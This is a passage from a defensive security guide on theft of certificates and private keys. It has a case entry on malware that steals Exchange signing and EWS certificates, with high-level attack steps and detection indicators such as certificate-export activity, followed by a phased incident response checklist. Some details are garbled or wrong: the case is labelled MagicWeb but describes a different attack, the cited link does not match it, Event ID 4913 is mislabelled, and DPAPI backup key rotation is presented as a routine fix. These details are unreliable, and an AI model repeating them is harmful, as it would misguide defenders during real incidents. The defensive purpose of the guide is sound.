- **Technique Status**: T1552.004 targeting authentication certificates and service account keys
- **Attack Method**:
  1. Malware deployed to Exchange or AD FS servers (post-compromise)
  2. Extracts EWS (Exchange Web Services) authentication certificates
  3. Extracts Exchange server signing certificates
  4. Maintains "dead drop" mechanisms for certificate exfiltration (HTTP requests to legitimate-looking URLs)
  5. Attacker uses stolen certificates to authenticate as Exchange service account
- **Impact**:
  - **Scope**: Multiple Exchange server deployments
  - **Email Access**: Attacker can authenticate to Exchange as service account (read all mailboxes)
  - **Data Theft**: Full email folder access, no audit trail (service account authentication appears legitimate)
  - **Persistence**: Works until certificate expires (months/years)
- **Key Evidence**:
  - Exchange service account authentication from unusual locations
  - CertUtil.exe or PowerShell certificate export activity in logs
  - Network: HTTPS connections to Exchange OWA using stolen certificate
- **Reference**: [Microsoft Security Blog - MagicWeb](https://www.microsoft.com/en-us/security/blog/2023/07/06/the-power-of-the-supply-chain-attack-malware-targeting-authentication-certificates/)

---

## 17. INCIDENT RESPONSE CHECKLIST

Use this checklist to guide response to a suspected private key theft incident:

### Immediate Actions (0-2 hours)

- [ ] **Isolate** affected DC/ADFS/Exchange server (disconnect network)
- [ ] **Preserve** forensic evidence:
  - [ ] Capture memory dump (procdump)
  - [ ] Export event logs (Security, System, Application)
  - [ ] Capture registry (DPAPI, CertSvc locations)
- [ ] **Disable** compromised service accounts (svc_adfs, svc_exchange, svc_account)
- [ ] **Notify** executive leadership and legal team
- [ ] **Preserve** email forwarding rules (attacker may have configured backdoor access)

### Short-Term Actions (2-24 hours)

- [ ] **Revoke** all compromised certificates on CA
- [ ] **Publish** updated CRL (ensure all clients reject revoked certs)
- [ ] **Force** DPAPI backup key rotation (invalidates stolen keys)
- [ ] **Reset** passwords on all domain admin accounts
- [ ] **Review** Event ID 4662 logs (past 30 days) for unauthorized access patterns
- [ ] **Correlate** stolen certificate usage with authentication logs (scope of compromise)
- [ ] **Enable** additional auditing:
  - [ ] Event ID 4662 (SecretObject access)
  - [ ] Event ID 4913 (Certificate properties modified)
  - [ ] Event ID 4688 (Process creation - monitor for extraction tools)

### Medium-Term Actions (1-2 weeks)

- [ ] **Conduct** forensic analysis of affected systems
- [ ] **Identify** what data was accessed using stolen keys (via audit logs)
- [ ] **Notify** compromised users (if data accessed)
- [ ] **Deploy** EDR solution with CryptoAPI hooking (prevent future key extraction)
- [ ] **Implement** hardening measures:
  - [ ] Enable TPM 2.0 enforcement (Server 2022+)
  - [ ] Mark sensitive certificates as non-exportable
  - [ ] Restrict DPAPI backup key access (RBAC hardening)
  - [ ] Implement HSM for critical keys
- [ ] **Engage** external forensics firm (if large-scale compromise)

### Long-Term Actions (Ongoing)

- [ ] **Monitor** all certificate-based authentications
- [ ] **Conduct** annual backup key rotation (prevents long-term impact if stolen)
- [ ] **Test** certificate revocation workflow (ensure CRL publication works)
- [ ] **Implement** security awareness training (phishing = initial access vector)
- [ ] **Document** lessons learned and update incident response procedures
- [ ] **Validate** detection rules in SIEM (tune false positives)

---
